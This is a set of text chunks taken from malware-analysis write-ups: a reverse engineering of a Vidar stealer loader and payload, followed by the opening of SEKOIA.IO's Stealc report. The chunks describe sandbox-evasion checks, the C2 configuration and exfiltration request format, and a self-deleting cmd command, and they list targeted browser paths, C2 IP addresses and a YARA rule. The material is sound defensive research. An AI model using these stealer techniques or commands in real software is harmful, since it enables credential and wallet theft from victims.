DiE Information I've opened the loader in DnSpy to further analyze it. The first thing I see is the confirmation that the loader is protected with Smart Assembly, I can see the PoweredBy section in the static information fields:"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|3c9f017c68194938ba8d2d47b31c157e
"SmartAssembly Signature Looking at the entry point we can understand that working with the loader in this state won't be efficient:

Loader Entry Point (with SmartAssembly) I will be using SAE (Simple Assembly Explorer) in order to deobfuscate the code, we can use the deobfuscator feature in SAE:

3/30

SAE deobfuscator feature I'm using the default settings as it's fits my needs:

Deobfuscator Settings Opening the deoubfuscated output file in Dnspy, we can now see a clearer code:

Post Deobfuscation Entry Point

Payload Extraction There are several interesting actions that happens in the loader:

4/30

1. 1. c000009 instance creation with internal field that will contain a path to the injected process.

c000009 Instance 2. 2. The instance then will be passed to the method c000066.m000022. this method will have several things in it, the first one being a call to the method: c000066.m00007b, passing the string: fInckSommmenn twice. 3. 3. The method c000066.m00007b will simply fetch resource content from the binary resources:

Resource Fetching Method 4. 4. Then a call to the method c000066.m000019 will be invoked passing the extracted resource content, the string: fInckSommmenn and the instance of c000009

5/30

5. 5. This method will be in charge of decrypting the payload with some Xor routine and it will return the decrypted binary."|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|da159bae838a45de9ed0ef7473d65100
"5/30

5. 5. This method will be in charge of decrypting the payload with some Xor routine and it will return the decrypted binary.

Decrypting Method 6. 6. After the decryption was done the decrypted binary will be passed alongside with the full path to the injected process to c000066.m00002a method which will do a process injection to the desired process with the decrypted binary content.

Loader Main Functionality I've created a powershell script that extract the decrypted binary by invoking the necessary methods: # Load the file. $assembly = [System.Reflection.Assembly]::LoadFile(""C:\Users\igal\Desktop\loader.exe"") ​ #Initialize ""NS005.c000009"" object. $ini = [Activator]::CreateInstance($assembly.Modules[0].GetType(""NS005.c000009""),@()) ​ #Retrieve the resource fetching method and invoke it. $classType2 = $assembly.GetType(""NS004.c000066"") $array = $classType2.GetMethod(""m00007b"").Invoke($null,@(""fInckSommmenn"", ""fInckSommmenn"")) ​ #Invoke the decryption method with the necessary arguments. $fixedArray = $classType2.GetMethod(""m000019"").Invoke($null,@($array, ""fInckSommmenn"", $ini))

6/30

​ #Write the output to a file. [io.file]::WriteAllBytes('C:\Users\igal\Desktop\payload.bin',$fixedArray)

Vidar Payload In this part of the blog I will be going through some of the Vidar stealer capabilities, evasion techniques and some anti analysis tricks. Opening the payload in DiE we can see that it's a 32bit C/C++ binary:

DiE Information"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|50a326050b3d499e8bdd53ab17fae2ed
"DiE Information

Anti-Analysis Nightmare I've opened the payload in IDA and the first thing that happens is that WinMain was not recognized as a function and rather as instruction:

Unrecognized WinMain I've tried to convert it to function by pressing P but this wasn't helpful, so I've scrolled a bit down and found out a chunk of data that wasn't converted as supposed:

7/30

Data Chunk Then I pressed C to convert that data to code and now that we have instructions instead of data I've marked all the instruction from the beginning of WinMain until the relevant mov - pop - return instructions that marks the end of a function (in my case the instructions range was 0x4156B0 - 0x415891) Now I start to work with the decompiler view, I've noticed that the decompilation process is a bit broken:

8/30

WinMain In Decompiler One thing that was done here to confuse the decompiler is Opaque Predicate. ""Opaque predicate is a term used in programming to refer to decision making where there is only one possible outcome. This can be achieved through the use of complex or hard-to-understand logic, such as calculating a value that will always return True. Opaque predicates are often used as anti-disassembling techniques, as they can make it difficult for an analyst to understand the code and determine its intent. By using opaque predicates, malware authors can make their code more difficult to reverse engineer, which can help to evade detection and analysis."" (Unprotect Project definition)"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|06dfcef0518c467cb5da88d10141121e
"Opaque Predicate We can use @_n1ghtw0lf script for it: import idc ​ ea = 0 while True: ea = min(idc.find_binary(ea, idc.SEARCH_NEXT | idc.SEARCH_DOWN, ""74 ? 75 ? ""), # JZ / JNZ idc.find_binary(ea, idc.SEARCH_NEXT | idc.SEARCH_DOWN, ""75 ? 74 ?"")) # JNZ / JZ if ea == idc.BADADDR: break idc.patch_byte(ea, 0xEB) # JMP idc.patch_byte(ea+2, 0x90) # NOP idc.patch_byte(ea+3, 0x90) # NOP After running the script the Decompiler looks a bit better:

9/30

Non Opaque Predicate in WinMain But there is still some code missing because we can see a JUMPOUT instruction, looking at the referenced address in the instruction, we can see that the instruction is: mov eax, 0FEB912E8h clearly that's wrong and nothing to do with the actual code (and this is caused because the conversation of all the data to code), it can be repaired by simply undefining the instruction. But after that we still can see a unclear jumpout:

Jumpout instructions again same strange mov instrcution to eax: mov eax, 0FEB9C8E8h it can be fixed by the same approach as before. After clearing the code we have a ""clear"" function:

10/30

Post Cleaning WinMain The Author added a lot of junk calls to the code to make our life a bit harder but we can just ignore them and follow the function calls."|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|b920bce7456e4024bc2e8c82e1f3da4e
"Self Termination Triggers This Vidar payload has several triggers that can occur and lead to self termination of the payload. The first one being usage of VirtualAllocExNuma which is a way for the payload to understand whether he runs on a system with one or more physical CPU:

VirtualAllocExNuma Function

11/30

The second check the payload does is checking the physical memory of the computer (whether it's above 769MB or not) if it's less then the defined size the payload will terminate:

Check Physical Memory Function The last check will occur after the strings and api resolving functions(which will be covered in a moment), it will retrieve the computer name and compare it to HAL9TH, it will also retrieve the user name and compare it to JohnDoe. if one of the retrieved values matches one of the strings the payload will terminate itself:

Check Computer Name Function

Strings Decryption As most variants of Vidar, the strings are simply xor'ed. The function receives 3 parameters: 1. 1. Length 2. 2. Xor key 3. 3. Encrypted string

12/30

Strings Decryption Function I've used the script written by @eln0ty and modified it a bit to fit my needs: import idc ​ START = 0x401190 END = 0x40134D TEMP = 0x0 FLAG = True ''' [0] = Encrypted String. [1] = Xor Key. [2] = Length.

13/30"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|ad1bb03a54734af3a09124817f217eed
"13/30

''' VALUES = [] ​ ea = START ​ # XOR decryption helper function. def xorDecrypt(encString, xorKey, keyLen): decoded = [] for i in range(0,len(encString)): decoded.append(encString[i] ^ xorKey[i % keyLen]) return bytes(decoded) ​ ​ ​ while ea <= END: # get argument values if idc.get_operand_type(ea, 0) == idc.o_imm: VALUES.append(idc.get_operand_value(ea, 0)) if len(VALUES) == 2: if idc.get_operand_type(ea, 0) == idc.o_reg: VALUES.append(idc.get_operand_value(ea, 1)) if idc.print_insn_mnem(ea) == ""call"": length = VALUES[2] data = idc.get_bytes(VALUES[0], length) key = idc.get_bytes(VALUES[1], length) VALUES = [] TEMP = ea while FLAG: ea = idc.next_head(ea, END) if (idc.print_insn_mnem(ea) == ""mov"") and (idc.get_operand_type(ea, 0) == idc.o_mem) and (idc.get_operand_type(ea, 1) == idc.o_reg): 14/30

dec = xorDecrypt(data, key, length).decode('ISO-8859-1') print(f'current location:{hex(ea)}, value will be: {dec}') dwordVar = idc.get_operand_value(ea, 0) idc.set_cmt(ea, dec, 1) idc.set_name(dwordVar, ""STR_"" + dec, SN_NOWARN) FLAG = False ea = TEMP break ​ ​ # move to next instruction FLAG = True ea = idc.next_head(ea, END) quick note: some of the names wont be assigned properly due to IDA syntax, so I've added the plain string as comment in the dissembler. For example:

Decrypted String Comment

Decoded strings output:

Decoded Strings"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|92599943a65e4cea999c7fe1df925eed
"Decrypted String Comment

Decoded strings output:

Decoded Strings

Dynamic API Resolving: Vidar will user LoadLibraryA and GetProcAddress to resolve the necessary API's alongside with the strings it decrypted:

15/30

API Resolve Function Once again I used the script written by @eln0ty to replace the name of the variables for easier analysis: import idc ​ start = 0x420874 end = 0x420901 ea = start ​ api_names = [] ​ while ea <= end: # get GetProcAddress API name if (idc.print_insn_mnem(ea) == ""mov"") and (idc.get_operand_type(ea, 0) == idc.o_reg) and (idc.get_operand_type(ea, 1) == idc.o_mem): addr = idc.get_operand_value(ea, 1) name = idc.get_name(addr) if name.startswith(""STR_""): api_names.append(name) ​

16/30

# assign GetProcAddress result to global var if (idc.print_insn_mnem(ea) == ""mov"") and (idc.get_operand_type(ea, 0) == idc.o_mem) and (idc.print_operand(ea, 1) == ""eax""): addr = idc.get_operand_value(ea, 0) name = api_names.pop(0) idc.set_name(addr, ""API_"" + name[4:]) ​ # move to next instruction ea = idc.next_head(ea, end)

C2 Communication - Init Communication In order to harvest all the data Vidar looking for, Vidar will need to utilize some DLL's which it will fetch from a C2 server, below is a short explanation of the DLL's Vidar will retrieve from the C2: DLL Name

Description

freebl3.dll

Network Security Services (NSS) from Mozilla Foundation

mozglue.dll

Memory management for Mozilla applications

msvcp140.dll"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|75d4cd108bba448398d7c13e7e42af9d
"freebl3.dll

Network Security Services (NSS) from Mozilla Foundation

mozglue.dll

Memory management for Mozilla applications

msvcp140.dll

Microsoft Visual C++ library for C++ programming

nss3.dll

Network security services for SSL/TLS encryption

softokn3.dll

Cryptographic library for key management and encryption/decryption

sqlite3.dll

Accessing and managing SQLite databases

vcruntime140.dll

Microsoft Visual C++ library for memory management and I/O

In my case the Vidar C2 was hosted on 2 different sites:

17/30

Telegram:

Telegram C2 URL Func

​

Telegram Channel Preview

18/30

Steam:

Steam C2 URL Func

​

Steam Profile Preview And in case both of them are down, a plain C2 is presented as a backup:

Plain C2 Function After retrieving the C2 Vidar will send a POST request to the URI: {C2}/{BOT_ID} In my case the bot id is: 907 which is also assigned a plain string:

19/30

Botnet ID Function After that first request was made the client will receive a response from the server that looks like that: 1,1,1,1,1,b36abae611984b4404a903d57724b39e,1,1,1,1,0,123;%DOCUMENTS%\;*.txt;50;true;movies:music:mp3:exe; Each operation is splitted with ; delimiter

C2 Communication - Operations Configuration As mentioned, each operation is splitted by ; delimiter. First Section: 1,1,1,1,1,b36abae611984b4404a903d57724b39e,1,1,1,1,0,123 Most of those values are flags that says what data should be harvested: Index

Flag

Description

1

1

Local Passwords

2

1

Cookies

3

1"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|8bd119a6010342d0a1e282d0e2a29fb6
"Flag

Description

1

1

Local Passwords

2

1

Cookies

3

1

Crypto Wallets

4

1

Browser History

5

1

Telegram Data

6

b36abae611984b4404a903d57724b39e

Exfil Token

7

1

Steam Data

8

1

Discord Data

9

1

Screenshot

10

1

Possible Grabber

11

0

File Size Limit

12

123

Profile ID

Second Section:

%DOCUMENTS%\

The grabber activity folder.

Third Section:



.txt

20/30

Files extensions the grabber will harvest. Fourth Section: 50 File size limit in KB. Fifth Section: true Recursive harvesting. Sixth Section: movies:music:mp3:exe Excluded file extensions. Additionally Vidar will create a profile for the user by harvesting the OS info, RAM, CPU, active processes etc... and will send out infromation.txt alongside with the harvested data: Version: 2.4 ​ Date: 12/2/2023 11:15:46 MachineID: 4cfb5922-b036-4c14-9ed1-03c0dad19fbd GUID: {d6dc608d-2a27-11ed-a0e3-806e6f6e6963} HWID: 12ac9eab3d083674480464-4cfb5922-b036-4c14-9ed1-a0e3-806e6f6e6963 ​ Path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\vbc.exe Work Dir: In memory ​ Windows: Windows 10 Pro [x64] Install date: 8/12/2021 0:18:31 AV: Unknown Computer Name: IYMUGYHL User Name: Admin Display Resolution: 1280x720 Display Language: en-US Keyboard Languages: English (United States) Local Time: 12/2/2023 11:15:47 21/30"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|fb6960fda90b449ca591646d049ff2a6
"TimeZone: UTC-0 ​ [Hardware] Processor: Intel Core Processor (Broadwell) Cores: 2 Threads: 2 RAM: 4095 MB VideoCard: Microsoft Basic Display Adapter ​ [Processes] - System [4] - Registry [92] - smss.exe [348] - csrss.exe [436] - wininit.exe [512] - csrss.exe [520] - winlogon.exe [604] - services.exe [644] - lsass.exe [656] - fontdrvhost.exe [764] - fontdrvhost.exe [772] - svchost.exe [780] - svchost.exe [884] - svchost.exe [932] - dwm.exe [1016] - svchost.exe [60] - svchost.exe [720] - svchost.exe [640] - svchost.exe [1044] - svchost.exe [1052]

22/30

svchost.exe [1140]

svchost.exe [1192]

svchost.exe [1208]

svchost.exe [1232]

svchost.exe [1316]

svchost.exe [1384]

svchost.exe [1432]

svchost.exe [1452]

svchost.exe [1504]

svchost.exe [1572]

svchost.exe [1604]

svchost.exe [1616]

svchost.exe [1712]

svchost.exe [1740]

svchost.exe [1840]

svchost.exe [1876]

svchost.exe [1900]

svchost.exe [1952]

svchost.exe [1968]

spoolsv.exe [1296]

svchost.exe [1944]

svchost.exe [2064]

svchost.exe [2100]

sihost.exe [2288]

svchost.exe [2296]

taskhostw.exe [2436]

svchost.exe [2488]

svchost.exe [2496]

OfficeClickToRun.exe [2552]

svchost.exe [2560]

23/30

svchost.exe [2616]

svchost.exe [2656]

svchost.exe [2668]

svchost.exe [2676]

svchost.exe [2976]

explorer.exe [3048]

svchost.exe [2832]

dllhost.exe [3248]

StartMenuExperienceHost.exe [3356]

RuntimeBroker.exe [3416]

dllhost.exe [3456]

SearchApp.exe [3568]

RuntimeBroker.exe [3688]

RuntimeBroker.exe [4652]"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|4fe9fdce15324f5d9f1875a97b847975
"RuntimeBroker.exe [3416]

dllhost.exe [3456]

SearchApp.exe [3568]

RuntimeBroker.exe [3688]

RuntimeBroker.exe [4652]

svchost.exe [4340]

svchost.exe [1892]

svchost.exe [3392]

svchost.exe [4424]

svchost.exe [4680]

sppsvc.exe [1096]

svchost.exe [1260]

svchost.exe [2544]

WmiPrvSE.exe [1348]

SppExtComObj.Exe [2532]

svchost.exe [2596]

svchost.exe [3020]

upfc.exe [4400]

svchost.exe [1632]

H&M Advertising contract and Payment information.pdf.scr [4396]

vbc.exe [1684]

24/30"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|d2fba685f5ee4dc9b7e5877fadb1b51d
"svchost.exe [3020]

upfc.exe [4400]

svchost.exe [1632]

H&M Advertising contract and Payment information.pdf.scr [4396]

vbc.exe [1684]

24/30

​ [Software] Google Chrome [89.0.4389.114] Microsoft Edge [92.0.902.67] Microsoft Edge Update [1.3.167.21] Microsoft Visual C++ 2012 Redistributable (x86) - 11.0.61030 [11.0.61030.0] Java Auto Updater [2.8.66.17] Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.30.30704 [14.30.30704.0] Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.30.30704 [14.30.30704.0] Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40660 [12.0.40660.0] Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40660 [12.0.40660] Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161 [9.0.30729.6161] Adobe Acrobat Reader DC [19.010.20069] Microsoft Visual C++ 2012 x86 Additional Runtime - 11.0.61030 [11.0.61030] Microsoft Visual C++ 2012 x86 Minimum Runtime - 11.0.61030 [11.0.61030] Microsoft Visual C++ 2022 X86 Additional Runtime - 14.30.30704 [14.30.30704] Microsoft Visual C++ 2012 Redistributable (x64) - 11.0.61030 [11.0.61030.0] Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40660 [12.0.40660] Microsoft Visual C++ 2013 Redistributable (x64) - 12.0.40660 [12.0.40660.0] Microsoft Visual C++ 2010 x86 Redistributable - 10.0.40219 [10.0.40219] Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.30.30704 [14.30.30704]"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|afc8e8d70ff9402dbdd03bc342326734
"C2 Communication - Data Exfiltration After harvesting all the data Vidar will compress all harvested data to as a zip encode it to base64 and send it out alongside with some more data in the next format: ------{random_generated_delimiter} Content-Disposition: form-data; name=""profile"" ​ {BOT_ID} ------{random_generated_delimiter} Content-Disposition: form-data; name=""profile_id"" ​ 25/30

{PERSONAL_ID}

-----



{random_generated_delimiter}

Content



Disposition: form



data; name=""hwid""

​

{COMPUTER_HWID}

-----



{random_generated_delimiter}

Content



Disposition: form



data; name=""token""

​

{EXFIL_TOKEN}

-----



{random_generated_delimiter}

Content



Disposition: form



data; name=""file""

{BASE64_ENCODED_ARCHIVE}

26/30

Exfiltration Function

Post Exfiltration Self Termination After Vidar exfiltrated the data it will create a self termination task using cmd command and by this will end the execution of itself: ""C:\Windows\System32\cmd.exe"" /c timeout /t 6 & del /f /q Vidar.exe & exit

27/30

Self Termination Function

Summary Vidar is a well known stealer that was active for the past years and keeps on constantly updated by its developers. In this blog we've covered most Vidar functions and how it was delivered to it's victims. Quick note that it's my first ""In Depth"" writeup for a malware so any feedback would be appreciated, you can always PM me on twitter (0xToxin)"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|a658fe1c99cb407d8b7669cb11b9f929
"Yara Rule The rule is updated up to version 2.4 which was recently revamped from version 5X.X (more info can be found here) rule win_Vidar { meta: author = ""0xToxin"" description = ""Vidar stealer strings and functions"" Date = ""20-02-2023"" strings:

28/30

$dll1 = ""vcruntime140.dll"" ascii wide $dll2 = ""softokn3.dll"" ascii wide $dll3 = ""nss3.dll"" ascii wide $dll4 = ""msvcp140.dll"" ascii wide $dll5 = ""mozglue.dll"" ascii wide $dll6 = ""freebl3.dll"" ascii wide $dll7 = ""sqlite3.dll"" ascii wide $c2Fetch1 = ""t.me"" ascii wide $c2Fetch2 = ""steamcommunity.com"" ascii wide $stringDec = { 68 ?? ?? ?? 00 68 ?? ?? ?? 00 B9 ?? ?? 00 00 E8 ?? ?? ?? ?? 68 ?? ?? ?? 00 68 ?? ?? ?? 00 B9 ?? ?? 00 00 A3 ?? ?? ?? ?? } condition: uint16(0) == 0x5a4d and 3 of ($dll*) and 1 of ($c2Fetch*) and #stringDec >= 15 } You can see also the Yara Hunt result on UnpackMe.

IOC's Samples: H&M Corporation Advertising Contract.zip 4d9697358936b516ecd2dd96687649fc1a8b1e8fd4529961dfa49513c85b42c5​ H&M Advertising contract and Payment information.pdf.scr 203b08962eba219761690043281f81fc2d6e1fa26702bfa4ad30d9849b267309​ vidar.bin - dd15f493fc13d00bb1abc0ac20bb0f7dc44632e71b4fcde1c2889fc34dff6c14​

29/30

Fetching URL's:

https://steamcommunity.com/profiles/76561199476091435

https://t.me/gurutist

C2's:

195.201.44.125

23.88.36.149:80

95.216.164.28:80

References

Malware Analysis



Previous

AsyncRAT OneNote Dropper

Last modified 8d ago

30/30"|data_input/vidar_reports/entry_12e09c59-467c-4056-9df2-5293175fea4c.text|37b4378810a74b5888cdfe3b9b268ccf
"Stealc: a copycat of Vidar and Raccoon infostealers gaining in popularity – Part 1 blog.sekoia.io/stealc-a-copycat-of-vidar-and-raccoon-infostealers-gaining-in-popularity-part-1/ 20 February 2023

Log in Whoops! You have to login to access the Reading Center functionalities! Forgot password?

Search the site... All categories Blogpost Blogpost Reset Blogpost This blogpost aims at presenting the activities of the Stealc’s alleged developer, a technical analysis of the malware and its C2 communications, and how to track it. CTI Cybercrime Malware Stealer

Threat & Detection Research Team February 20 2023 422 0 Read it later Remove 23 minutes reading

Context In January 2023, through our Dark Web monitoring routine, SEKOIA.IO identified a new information stealer advertised as Stealc by its alleged developer, going by the handle Plymouth. The threat actor presents Stealc as a fully featured and ready-touse stealer, whose development relied on Vidar, Raccoon, Mars and Redline stealers. This information suggests that this newcomer could be a serious competitor to the popular widespread malware families mentioned above.

1/17"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|57f93d15b01c458c84414fd78a403013
"1/17

In early February 2023, SEKOIA.IO identified a new malware family when tracking infrastructures distributing information stealers. The Command and Control (C2) communications of the associated samples share similarities with those of Vidar and Raccoon. Further analysis by SEKOIA.IO allowed us to associate this new malware family with Stealc. The investigation led us to discover several dozens of Stealc samples distributed in the wild, and more than 40 Stealc C2 servers, certainly an indication that this new infostealer became widespread and popular among cybercriminals distributing stealers. SEKOIA.IO therefore conducted an in-depth analysis of this emerging threat. This blog post aims at presenting the activities of the Stealc’s alleged developer, a technical analysis of the malware and its C2 communications, and how to track it. We also share details on Stealc capabilities (Annex 1) and an infection chain distributing it (Annex 2). In a follow-up blog post, we will share a write-up on the reverse engineering of Stealc to take a look at the different techniques implemented by the malware."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|920b8a0e93f94e9ebd7b4195b9bc5fa9
"A successful entry into the cybercrime market First Stealc advertisement On 9 January, 2023, Plymouth advertised the Stealc information stealer for the first time on XSS and BHF Russians-speaking underground forums. The threat actor published a detailed description of the new malware to list its wide stealing capabilities, the fully featured and well designed administration panel, and some technical characteristics.

Figure 1. Advertisement for Stealc stealer on XSS, published by Plymouth on 9 January, 2023 By default, Stealc targets sensitive data from most used web browsers, browser extensions for cryptocurrency wallets, desktop cryptocurrency wallets and information from additional applications, including email client and messenger software. Compared to other stealers SEKOIA.IO analysed, the data collection configuration can be customised to tailor the malware to the customer needs. Stealc also implements a customisable file grabber, allowing its customers to steal files matching their grabber rules. The stealer also has loader capabilities that would be usually expected for an information stealer sold as a Malware-as-a-Service (MaaS). A complete list of Stealc capabilities is shared in Annex 1. The administration panel is also fully featured and allows its users (i.e. threat actors distributing the stealer), to: set up the malware configuration; parse, display, filter, sort and analyse the stolen data;

2/17"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|8976fbf0dc1e4ff0ad2e61b8120f7d01
"2/17

download the logs (stolen data) with several options. SEKOIA.IO observed that logs handling is a key feature for all information stealers entering the MaaS market. Threat actors are likely to sell the stolen data on logs marketplace and therefore need to download it in a personalised way. In addition, they need to identify and extract the valuable credentials and files from the large amounts of collected data. Thus, we assess Plymouth, the Stealc presumed developer, almost certainly dedicated a great effort to develop the administration panel on sorting and downloading logs features."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|1d6c1659b5b34685856fef7acc1af7e6
"Plymouth’s activity carried out in a professional manner After the first publication on 9 January, 2023 on XSS and BHF, Plymouth continued to advertise its infostealer to reach a larger audience on additional channels, including Exploit hacking forum and Telegram messaging application. To gain the trust of potential customers, developers often offer free malware tests to cybercrime forum users to collect reviews and possibly positive feedback on their product. This is considered as a guarantee of quality, similarly to a Bitcoin deposit on a cybercrime forum. On some forums, it is even required to make a deposit or have relevant feedback from an administrator, moderator or experienced user to sell a product or service. As shown in the following figure, Plymouth fulfils both: a 0.02 Bitcoin deposit (around $400 at the time of deposit), and free weekly tests offered to XSS users. We assess with high confidence that its alleged developer quickly established itself as a reliable threat actor, and its malware gained the trust of cybercriminals dealing with infostealers.

Figure 2. Plymouth’s post offering Stealc"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|e7ed8515ace641bfa1a6a66509288c17
"Figure 2. Plymouth’s post offering Stealc

free weekly tests, Plymouth’s profile indicates a deposit of 0.02 Bitcoin on XSS forum (translated from Russian) In addition, Plymouth released several versions of Stealc and published changelogs on different forums, as well as on a dedicated Telegram channel (hxxps://t[.]me/stealc_changelog). The changelogs introduce new features and bug fixes. Main changes for each release are listed in the following figure.

Figure 3. Timeline of Stealc releases and Plymouth’s activities Plymouth’s publications and observed activities indicate that Stealc is under ongoing development with new features added on a weekly basis. While the stealer is already functional and adopted by several threat actors, the developer continues to improve both malware and administration panels, likely to expand its customer base.

3/17

Technical analysis Before analysing Stealc’s execution process and C2 communications, we present how we associate the new malware family with the malware advertised by Stealc."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|f0fe0052dcc24e4f86be43ffa4694e94
"Malware sample association In early February 2023, SEKOIA.IO analysts found a sample of an unknown malware by investigating an infrastructure typically used to distribute stealers (SHA256: a2465fc5059ea57c7b64b1dc01caf8735422a005ddb7fabeddfa3cbc89085ccf, https://tria.ge/230212-pkc69adh37). The sample execution raises two specific characteristics: The download of a legitimate third-party DLLs, already observed being abused by stealers (sqlite3.dll, freebl3.dll, mozglue.dll, msvcp40.dll, nss3.dll, softokn3.dll and vcruntime140.dll); The execution of a command deleting all DLLs in C:\ProgramData. From these behaviours, we pivoted on dozens of samples that appear to belong to the same malware family using the following query on VirusTotal: behaviour:""C:\ProgramData\*.dll"" behaviour:""timeout /t 5"" behaviour:""sqlite3.dll""

Figure 4. Search on specific behaviours of the malware sample on VirusTotal yielding to packed and unpacked samples The results returned standalone samples of about 80KB (SHA256: 77d6f1914af6caf909fa2a246fcec05f500f79dd56e5d0d466d55924695c702d), we analysed it in depth to corroborate the association of this new malware family to Stealc. Here is a summary of the association of Stealc features as advertised by Plymouth and sample features observed by SEKOIA.IO. Stealc features, as described by Plymouth on XSS

SEKOIA.IO observations based on samples of the new malware family

When developing our solution, we relied on Vidar, Raccoon, Mars and RedLine"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|e4bc671457cd47c198eb1ba2fc52cf44
"SEKOIA.IO observations based on samples of the new malware family

When developing our solution, we relied on Vidar, Raccoon, Mars and RedLine

Stealc, Vidar, Raccoon and Mars all download legitimate third-party DLLs (sqlite3.dll, nss3.dll, etc. ), as the found sample.

Current build weight – 78kb

The standalone sample is approximately 80KB.

stealc was written in pure C using WinAPI

C written malware uses WinAPI functions.

all functions are dynamically loaded

Once the strings are deobfuscated, the malware loads the WinAPI functions using GetProcAddress and LoadLibraryA.

import table is taken by couple of imports from mscrt

The import address table imports 6 functions from MsvcrtDLL.

4/17

All lines of work are obfuscated.

All strings are obfuscated using RC4 and base64, except a few ones which are related to new features (update v1.1.2).

stealc does not generate an archive on the client side, each file to be collected is sent to the server in a separate request

The malware exfiltrates the collected data file by file and doesn’t wait to receive all configuration to collect and send data.

more than 23 supported browsers

Based on the configuration sent by the C2, the malware targets 22 browsers.

more than 70 web plugins

Based on the configuration sent by C2, Stealc targets 75 plugins.

more than 15 desktop wallets

Based on the configuration sent by C2, Stealc targets 25 wallets.

email clients"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|73a3a857f07941878d4dae39206063a0
"more than 15 desktop wallets

Based on the configuration sent by C2, Stealc targets 25 wallets.

email clients

The sample collects data from Outlook files (\Outlook\accounts.txt), the configuration is stored in the obfuscated data.

added random name generation for script-gate (api.php), in stealc update v1.1.2

The first samples communicated on /api.php and downloaded the DLLs from /libs/. Recent samples used random paths ([a-f0-9]{16}) for data exfiltration and DLL download.

recorded user-agents in the system_info.txt file, in stealc update v1.1.2

The malware exfiltrates victim host’s user agents.

recorded ip and country in file system_info.txt, in stealc update v1.1.2

IP address and country of the infected host (ISO) are exfiltrated to the C2.

Table 1. SEKOIA.IO observations on the advertised Stealc features and collected samples Based on this comparative table, SEKOIA.IO analysts assess this new malware family found in the wild matches Stealc infostealer with high confidence."|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|c529df25103744dfa7d40ad10722f78d
"Technical overview of Stealc sample SEKOIA.IO reverse engineered Stealc and will publish an in-depth analysis to share further details. In the meantime, here is an overview of the main steps of Stealc execution. Once executed, Stealc deobfuscates all its RC4-encrypted and base64-encoded strings. It then compares the system date to the hardcoded date in the obfuscated strings. If the execution occurs after the hardcoded date, the malware stops. This check is likely implemented by the stealer developer to limit the customer’s activity to the licence validity period. Stealc also checks for virtual or sandbox environments by comparing the machine name to HAL9TH and the user name to JohnDoe, solely used by Microsoft Defender emulator. The malware dynamically loads the different WinAPI functions using LoadLibrary and GetProcAddress, and initiates the communication to its C2 server. Here is a step-by-step analysis of the malware communication: 1. Stealc first sends the victim’s host HWID (Hardware Identifier) and build name to its C2 server, using a POST request on the server gate (name=”hwid”, name=”build”). The server responds with the base64-encoded configuration, such as: d325580bb149e327a7c8338ec6c9ac7227e7c319411261441d8d3097b2a2d6e5fef3ce48|isdone|docia.docx| 1|1|0|1|1|1|1|1|

5/17"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|d087f460827a4cb08394486c4c2a1a60
"5/17

Figure 5. Stealc C2 communication, first POST request to send the victim host HWID and build name 1. The malware sends the command browsers to the C2 to retrieve its configuration for data collection from web browsers, using a POST request on the server gate (name=”token”, name=”message” (browsers)). Again, the server responds with the base64-encoded configuration, such as: Google Chrome|\Google\Chrome\User Data|chrome|Google Chrome Canary|\Google\Chrome SxS\User Data|chrome|Chromium|\Chromium\User Data|chrome|Amigo|\Amigo\User Data|chrome|Torch|\Torch\User Data|chrome|Vivaldi|\Vivaldi\User Data|chrome|Comodo Dragon|\Comodo\Dragon\User Data|chrome|EpicPrivacyBrowser|\Epic Privacy Browser\User Data|chrome|CocCoc|\CocCoc\Browser\User Data|chrome|Brave|\BraveSoftware\Brave-Browser\User Data|chrome|Cent Browser|\CentBrowser\User Data|chrome|7Star|\7Star\7Star\User Data|chrome|Chedot Browser|\Chedot\User Data|chrome|Microsoft Edge|\Microsoft\Edge\User Data|chrome|360 Browser|\360Browser\Browser\User Data|chrome|QQBrowser|\Tencent\QQBrowser\User Data|chrome|CryptoTab|\CryptoTab Browser\User Data|chrome|Opera Stable|\Opera Software|opera|Opera GX Stable|\Opera Software|opera|Mozilla Firefox|\Mozilla\Firefox\Profiles|firefox|Pale Moon|\Moonchild Productions\Pale Moon\Profiles|firefox|Opera Crypto Stable|\Opera Software|opera|Thunderbird|\Thunderbird\Profiles|firefox|"|data_input/vidar_reports/entry_869869ff-7902-4b73-9708-991d9447a50d.text|944bf165b01245d1abdf72d49db7d600
